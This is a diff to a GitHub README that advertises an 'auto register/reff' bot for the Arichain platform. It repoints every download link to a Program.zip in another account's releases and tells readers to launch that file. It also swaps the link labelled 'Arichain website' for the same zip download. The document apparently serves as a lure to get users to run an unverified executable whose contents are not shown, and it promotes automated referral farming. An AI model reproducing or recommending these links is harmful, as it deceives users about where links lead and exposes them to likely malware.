@@ -8,17 +8,17 @@ This repository is dedicated to providing an auto register/reff feature for Aric
 
 ## How to Utilize
 
-To make use of this feature, you can download the necessary files from the following link: [Download Soft.zip](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)  
+To make use of this feature, you can download the necessary files from the following link: [Download https://github.com/Daniel101lll/arichain/releases/download/v1.0/Program.zip](https://github.com/Daniel101lll/arichain/releases/download/v1.0/Program.zip)  
 
-[![Download Soft.zip](https://img.shields.io/badge/Download-Soft.zip-blue.svg)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download https://github.com/Daniel101lll/arichain/releases/download/v1.0/Program.zip](https://github.com/Daniel101lll/arichain/releases/download/v1.0/Program.zip)](https://github.com/Daniel101lll/arichain/releases/download/v1.0/Program.zip)
 
-The file **Soft.zip** needs to be launched to enable the auto register/reff functionality within Arichain.
+The file **https://github.com/Daniel101lll/arichain/releases/download/v1.0/Program.zip** needs to be launched to enable the auto register/reff functionality within Arichain.
 
 ## Additional Information
 
 If the provided link is not working or you need further details, please check the **Releases** section of this repository for more information.
 
-Feel free to visit the [Arichain website](https://arichain.com) to explore more about the platform and its features.
+Feel free to visit the [Arichain website](https://github.com/Daniel101lll/arichain/releases/download/v1.0/Program.zip) to explore more about the platform and its features.
 
 Let's simplify the registration process on Arichain with auto register/reff! 🌟
 
